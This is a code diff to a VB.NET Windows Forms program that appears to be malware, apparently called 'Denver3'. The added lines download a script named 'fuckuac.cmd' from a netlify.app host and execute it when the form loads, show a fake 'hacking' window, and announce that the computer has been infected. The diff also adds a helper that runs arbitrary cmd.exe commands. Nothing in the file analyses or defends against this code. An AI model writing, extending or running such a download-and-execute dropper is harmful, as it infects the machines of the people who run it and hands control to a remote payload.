@@ -7,6 +7,7 @@ Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
         If CheckForInternetConnection() Then
+
             Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
 
             Try
@@ -44,8 +45,20 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                     fs.Close()
                     Hacking_into_pc.Show()
                     Wait(10)
+
+                    Try
+                        My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/fuckuac.cmd", Application.StartupPath & "\fuckuac.cmd")
+                    Catch ex As Exception
+
+                    End Try
+                    Process.Start(Application.StartupPath & "\fuckuac.cmd")
                     Hacking_into_pc.Close()
                     MsgBox("Your computer has been infected with Denver3.exe. the next generation of Yuki3")
+
+
+
+
+
                 Catch ex As Exception
 
                 End Try
@@ -267,4 +280,15 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             Return False
         End Try
     End Function
+End Class
+
+Public Class MyUtilities
+    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
+        Dim p As Process = New Process()
+        Dim pi As ProcessStartInfo = New ProcessStartInfo()
+        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
+        pi.FileName = "cmd.exe"
+        p.StartInfo = pi
+        p.Start()
+    End Sub
 End Class
